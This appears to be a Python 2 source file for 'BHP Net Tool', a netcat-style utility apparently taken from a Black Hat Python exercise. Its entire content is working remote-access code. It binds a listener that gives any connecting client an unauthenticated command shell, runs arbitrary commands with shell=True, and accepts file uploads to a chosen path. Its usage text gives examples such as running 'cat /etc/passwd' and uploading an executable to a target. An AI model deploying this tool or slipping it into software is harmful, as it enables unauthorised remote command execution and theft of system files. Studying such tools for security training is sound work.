#!/usr/bin/env python

import sys
import socket
import getopt
import threading
import subprocess

#define some global variables
listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0

def usage():
    print "BHP Net Tool"
    print
    print "Usage: bhpnet.py -t target_host -p port"
    print "-l --listen              - listen on [host]:[port] for incoming connections"
    print "-e --execute=file_to_run - execute the given file upon receiving a connection"
    print "-c --commandshell        - initialize a command shell"
    print "-u --upload=destination  - upon receiving connection upload a file and write to [destination]"
    print
    print
    print "Examples: "
    print "bhpnet.py -t 192.168.1.1 -p 5555 -l -c"
    print "bhpnet.py -t 192.168.1.1 -p 5555 -l -u=c:\\target.exe"
    print "bhpnet.py -t 192.168.1.1 -p 5555 -l -e=\"cat /etc/passwd\""
    print "echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.1.1 -p 135"
    sys.exit(0)
  
def client_sender(buffer):
    print 'Entering client_sender'
    
    client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        print 'Connecting to client'
        client.connect((target,port))
        print 'Connection successful'
        if len(buffer):
            client.send(buffer)
            
        while True:
            #now wait for data to come back
            recv_len = 1
            response = ""
            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                
                response+=data
                
                print 'recv_len %s'%str(recv_len)
                if recv_len < 4096:
                    break
                
            print response,
            
            #wait for more input
            buffer = raw_input("")
            buffer += "\n"
            
            #send it off
            client.send(buffer)
            
            
    except Exception as err:
        print "[*] Exception! Exiting"
        print str(err)
    finally:        
        print 'Closing the client'        
        client.close()
        
def server_loop():
    global target
    
    #if no target is defined we listen on all interfaces
    if not len(target):
        print 'No target found setting to 0.0.0.0 for all interfaces'
        target = "0.0.0.0"
    
    print 'Creating socket'
    server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server.bind((target,port))
    server.listen(5)
    
    while True:
        print 'Waiting for connections'
        client_socket, addr = server.accept()
        
        #spin off a client thread to handle our new client
        print 'Connection from %s %s'%(addr[0],str(addr[1]))
        print 'Starting the client handler'
        client_thread = threading.Thread(target=client_handler,args=(client_socket,))
        client_thread.start()
def run_command(command):
    #trim newline
    command = command.rstrip()
    
    #run the command and get the output back
    try:
        output = subprocess.check_output(command,stderr=subprocess.STDOUT,shell=True)
    except:
        output = "Failed to execute command.\r\n"
    return output
def client_handler(client_socket):
    print 'client handler started'
    global upload
    global execute
    global command
    
    #check for upload
    if len(upload_destination):
        #read in all of the bytes and write to our destination
        file_buffer = ""
        print 'uploading file to %s'%upload_destination
        #keep reading data until none is available
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            else:
                file_buffer+=data
                
        #now we take these bytes and try to write them out
        try:
            print 'writing to file %s'%upload_destination
            file_descriptor = open(upload_destination,"wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()
            
            #acknowledge that we wrote the file out
            client_socket.send("Successfully saved the file to %s\r\n"%upload_destination)
        except:
            print 'There was an exception in uploading the file'
            client_socket.send("Failed to save the file to %s\r\n"%upload_destination)
            
    if len(execute):
        #run the command
        print 'running the command %s'%execute
        output = run_command(execute)
        print 'sending the output %s'%output
        client_socket.send(output)
        
    if command:
        while True:
            print 'dropping shell to the client'
            #show a simple prompt
            client_socket.send("<BHP:#> ")
            
            #now we receive until we see a line feed
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer+=client_socket.recv(1024)
                
            if 'quit' == cmd_buffer.lower():
                break
            
            #send back the command output
            response = run_command(cmd_buffer)
            
            #send back the response
            client_socket.send(response)
            
        
def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target
    
    if not len(sys.argv[1:]):
        usage()
        
    try:
        opts,args = getopt.getopt(sys.argv[1:],"hle:t:p:cu",["help","listen","execute","target","port","command","upload"])
    except getopt.GetoptError as err:
        print str(err)
        usage()
        
    for o,a in opts:
        if o in ("-h","--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
            continue
        elif o in ("-e","--execute"):
            execute = a
            continue
        elif o in ("-c","--commandshell"):
            command = True
            continue
        elif o in ("-u","--upload"):
            upload_destination = a
            continue
        elif o in ("-t","--target"):
            target = a
            continue
        elif o in ("-p","--port"):
            port = int(a)
            continue
        else:
            assert False,"Unhandled Option"
        
    #Are we going to listen or just send data from stdin?
    if not listen and len(target) and port > 0:
        #read in the buffer from the commandline
        #this will block, so send CTRL-D if not sending input
        #to stdin
        buffer = sys.stdin.read()
        
        #send data off
        client_sender(buffer)
        
    #If we are going to listen and potentially 
    #upload things, execute commands and drop a shell back
    #depending on our commandline options above
    if listen:
        server_loop()

main()
            
        
            
        